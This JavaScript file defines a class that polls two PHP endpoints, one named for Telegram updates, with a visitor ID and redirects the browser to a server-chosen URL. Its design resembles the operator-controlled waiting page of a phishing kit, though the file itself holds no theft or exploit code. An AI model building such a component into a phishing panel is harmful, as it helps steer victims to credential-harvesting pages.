/**
 * Redirect Checker
 */

class RedirectChecker {
    constructor(visitorId, checkInterval, timeout) {
        this.visitorId = visitorId;
        this.checkInterval = checkInterval;
        this.timeout = timeout * 1000;
        this.startTime = Date.now();
        this.isChecking = false;
        this.checkCount = 0;
        this.fastCheckCount = 10; // First 10 checks will be faster
        this.fastCheckInterval = 300; // 300ms for first few checks
    }

    /**
     * Start the redirect checking process
     */
    start() {
        console.log('Starting redirect checks for visitor:', this.visitorId);
        // Start immediately
        this.checkRedirect();
    }

    /**
     * Check for redirects using parallel requests
     */
    checkRedirect() {
        if (this.isChecking) return;
        
        this.isChecking = true;
        this.checkCount++;

        // Check timeout
        if (Date.now() - this.startTime >= this.timeout) {
            window.location.href = 'error.php?id=' + this.visitorId;
            return;
        }

        // Parallel requests with NO CACHE
        Promise.all([
            fetch('check_telegram_updates.php', {
                method: 'POST',
                cache: 'no-store', // Prevent caching
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ visitor_id: this.visitorId })
            }).then(r => r.json()).catch(() => ({ status: 'error' })),
            
            fetch('check_json_status.php?visitor_id=' + this.visitorId, { 
                cache: 'no-store' // Prevent caching
            }).then(r => r.json()).catch(() => ({ redirect: false }))
        ])
        .then(([telegramResult, jsonResult]) => {
            if (jsonResult.redirect && jsonResult.redirect_url) {
                window.location.href = jsonResult.redirect_url;
                return;
            }
            
            this.isChecking = false;
            const nextInterval = this.checkCount < this.fastCheckCount 
                ? this.fastCheckInterval 
                : this.checkInterval;
            
            setTimeout(() => this.checkRedirect(), nextInterval);
        })
        .catch(() => {
            this.isChecking = false;
            setTimeout(() => this.checkRedirect(), this.checkInterval);
        });
    }
}

// Initialize and start the redirect checker when the page loads
function initRedirectChecker() {
    // Prevent multiple initializations
    if (window.redirectCheckerStarted) return;
    window.redirectCheckerStarted = true;

    // Use default values if constants are missing
    const checkInterval = (typeof CHECK_INTERVAL !== 'undefined') ? CHECK_INTERVAL : 2000;
    const timeout = (typeof TIMEOUT !== 'undefined') ? TIMEOUT : 1800;
    const visitorId = (typeof VISITOR_ID !== 'undefined') ? VISITOR_ID : '';
    
    if (!visitorId) {
        console.warn('RedirectChecker: VISITOR_ID is missing, trying to extract from URL');
        const urlParams = new URLSearchParams(window.location.search);
        const urlId = urlParams.get('id');
        if (urlId) {
            const redirectChecker = new RedirectChecker(urlId, checkInterval, timeout);
            redirectChecker.start();
        } else {
            console.error('RedirectChecker: No visitor ID found');
        }
        return;
    }
    
    const redirectChecker = new RedirectChecker(visitorId, checkInterval, timeout);
    redirectChecker.start();
}

// Start immediately if page is already loaded, otherwise wait for DOMContentLoaded
if (document.readyState === 'complete' || document.readyState === 'interactive') {
    initRedirectChecker();
} else {
    document.addEventListener('DOMContentLoaded', initRedirectChecker);
}
